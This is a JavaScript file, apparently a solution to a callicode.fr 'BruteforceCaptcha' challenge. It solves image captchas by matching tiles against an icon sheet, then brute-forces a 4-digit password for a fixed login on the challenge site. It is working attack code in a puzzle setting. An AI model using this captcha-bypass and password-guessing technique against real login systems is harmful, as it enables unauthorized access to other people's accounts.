const fs = require('fs');
const fetch = require('node-fetch');
const assert = require('assert');
const htmlparser = require("htmlparser");
const ndOps = require("ndarray-ops");
const ndarrayPack = require("ndarray-pack");
const ndarrayUnpack = require("ndarray-unpack");
const getPixels = require('get-pixels');
const savePixels = require('save-pixels');
const logger = require("../../../../utils/logger");

const ICONS = "./src/defis/kakawouette/succeeded/bruteforcecaptcha/ICONS_SYMBOL_sm.png";
// const LETTERS = "./src/defis/kakawouette/succeeded/bruteforcecaptcha/letters.jpg";

const URL = "https://callicode.fr/pydefis/BruteforceCaptcha/hydra/GRAAUEVJEQQbAAQcDwAEFRY=/";
const LOGIN = "redskull";

const size = 25;
// const move = 28;
const move = 34;
// const firstX = 27;
// const firstY = 44;
const firstX = 43;
const firstY = 89;
const offsetLetters = 355;
const lines = [
    [1,1,0,0,0,0,0,0,0,0,0,0,0,0,1],
    [1,1,0,0,0,0,0,0,1,1,1,1,1,1,1],
    [1,1,0,0,0,0,0,0,1,1,1,1,1,1,1],
    [1,1,1,1,1,1,1,1,1,1,1,1,1,1,1],
    [1,1,1,1,1,1,1,1,1,1,1,1,1,1,1],
    [1,1,1,1,1,1,1,1,1,1,1,1,1,1,1],
    [1,1,1,0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,1,1,1,1,1,1],
    [0,0,0,0,0,0,0,0,0,1,1,1,1,1,1],
];
const letters = [
    ['Ca','Sp',0,0,0,0,0,0,0,0,0,0,0,0,'Dm'],
    ['Hu','Im',0,0,0,0,0,0,'Rb','Nw','Fs','Hg','Mm','S','Co'],
    ['T','Bw',0,0,0,0,0,0,'Sg','Gy','Cn','At','Fl','B','Rr'],
    ['He','Dd','Mf','Px','Wo','St','Ag','Cl','Bg','Cs','Cb','Em','Hm','Gl','Oz'],
    ['Dp','Qs','Ht','Jg','Ic','Bs','Nc','Ef','Ja','Bb','Sm','Rt','Ga','Ww','No'],
    ['Bp','Sw','Iw','Cy','Hv','Rg','Ba','Gb','Vx','Vb','Cm','Z','Bc','Aq','Ss'],
    ['Am','Pn','Th',0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,'Gg','Ve','Lk','Jo','Lx','Cw'],
    [0,0,0,0,0,0,0,0,0,'Ma','Do','Rs','Si','Ds','Ri']
];

let PASSWORD_COUNT = 0;
let PASSWORD_BASE = 5000;
let bascule = 1;
let count = 0;

function tryLogin(captcha,login,password){
    fetch(`${URL}validate_login?captcha=${captcha}&login=${login}&password=${password}`).then(function(response) {
        return response.text();
    })
    .then(function(text) {
        if(text.includes('Login / Pass erroné redskull')){
            const withoutBeforeP = text.substring(text.indexOf('<p align="center">'),text.indexOf('</p>'));
            PASSWORD_COUNT = PASSWORD_BASE + (count*bascule);
            if(bascule>0) {
                count++;
            }
            bascule = bascule *(-1);
            logger.info(password, withoutBeforeP);
            bruteForce();
        }else {
            logger.info(text);
            logger.info("GOOD PASSWORD ",password);
        }
    })
    .catch(function(error) {
        logger.info('Request failed', error)
        bruteForce();
    });
}

function resolveCaptcha(path,login,password){
    let word = [];
    getPixels(path, function(err, captcha) {
        const captchas = [
            ndarrayPack(ndarrayUnpack(captcha.lo(0, 0).hi(25,25))),
            ndarrayPack(ndarrayUnpack(captcha.lo(25, 0).hi(25,25))),
            ndarrayPack(ndarrayUnpack(captcha.lo(50, 0).hi(25,25))),
            ndarrayPack(ndarrayUnpack(captcha.lo(75, 0).hi(25,25))),
            ndarrayPack(ndarrayUnpack(captcha.lo(100, 0).hi(25,25))),
            ndarrayPack(ndarrayUnpack(captcha.lo(125, 0).hi(25,25)))
        ];
        const destCoordinates = [];
        captchas.forEach((c,index) => {
            const outFile = fs.createWriteStream(`./src/defis/kakawouette/succeeded/bruteforcecaptcha/debug/captcha${index}.png`);
            savePixels(c, "png").pipe(outFile);
        });
        getPixels(ICONS, function (err, pixels) {
            lines.forEach((line, l) => {
                line.forEach((column, c) => {
                    if (column) {
                        let x = firstX + (c) * move;
                        let y = firstY + (l) * move;
                        const icon = ndarrayPack(
                            ndarrayUnpack(
                                pixels.lo(
                                    x, y
                                ).hi(
                                    size,
                                    size
                                )
                            )
                        );
                        captchas.forEach((captcha,index) => {
                            if(ndOps.equals(captcha,icon)){
                                destCoordinates.push({index,x,y});
                                word[index] = letters[l][c];
                            }
                        });

                        // const outFile = fs.createWriteStream(`./src/defis/kakawouette/succeeded/bruteforcecaptcha/debug/icons/${l}-${c}.png`);
                        // savePixels(icon, "png").pipe(outFile);
                    }
                })
            });

            //Should be found now
            const captchaWord = word.reduce((a, b) => a+b);
            // logger.info(captchaWord);

            tryLogin(captchaWord,login,password);

            //For debug

            // lines.forEach((line, l) => {
            //     line.forEach((column, c) => {
            //         if (column) {
            //             let x = firstX + (c) * move;
            //             let y = firstY + offsetLetters + (l) * move;
            //             const icon = ndarrayPack(
            //                 ndarrayUnpack(
            //                     pixels.lo(
            //                         x, y
            //                     ).hi(
            //                         size,
            //                         size
            //                     )
            //                 )
            //             );
            //             destCoordinates.forEach((coords) => {
            //                 if(coords.x === x && coords.y === y-offsetLetters){
            //                     const outFile = fs.createWriteStream(`./src/defis/kakawouette/succeeded/bruteforcecaptcha/debug/captcha${coords.index}_letters.png`);
            //                     savePixels(icon, "png").pipe(outFile);
            //                 }
            //             });
            //
            //
            //             // const outFile = fs.createWriteStream(`./src/defis/kakawouette/succeeded/bruteforcecaptcha/debug/letters/${l}-${c}.png`);
            //             // savePixels(icon, "png").pipe(outFile);
            //         }
            //     })
            // });

        });
    });
}

// describe('BruteforceCaptcha', function() {
//     describe('myTest()', function() {
//         it('should return true', function() {
//             assert.equal(true,myTest());
//         });
//     });
// });

function searchImages(dom,list){
    if(dom.type === "tag" && dom.name === "img"){
        list.push(dom);
    }else{
        if(dom.children) {
            dom.children.forEach((child) => {
                searchImages(child, list);
            })
        }
    }
}

// function to create file from base64 encoded string
function base64_decode(base64str, file) {
    // create buffer object from base64 encoded string, it is important to tell the constructor that the string is base64 encoded
    var bitmap = new Buffer(base64str, 'base64');
    // write buffer to file
    fs.writeFileSync(file, bitmap);
    // logger.info('******** File created from base64 encoded string ********');
    return bitmap;
}


function bruteForce() {
    fetch(`${URL}login`).then(function (response) {
        return response.text();
    })
        .then(function (text) {
            let handler = new htmlparser.DefaultHandler();
            let parser = new htmlparser.Parser(handler);
            parser.parseComplete(text);
            const list = [];
            searchImages(handler.dom[1], list);
            const img = base64_decode(list[1].data.substring(0, list[1].data.length - 1).replace("img src=\"data:image/png;base64,", ""), "./src/defis/kakawouette/succeeded/bruteforcecaptcha/debug/captcha.png")

            resolveCaptcha("./src/defis/kakawouette/succeeded/bruteforcecaptcha/debug/captcha.png", LOGIN, String("0000" + PASSWORD_COUNT).slice(-4));
        })
        .catch(function (error) {
            logger.info('Request failed', error)
            bruteForce();
        });
}
module.exports =  {
    launch : () => {
        bruteForce();
    }
};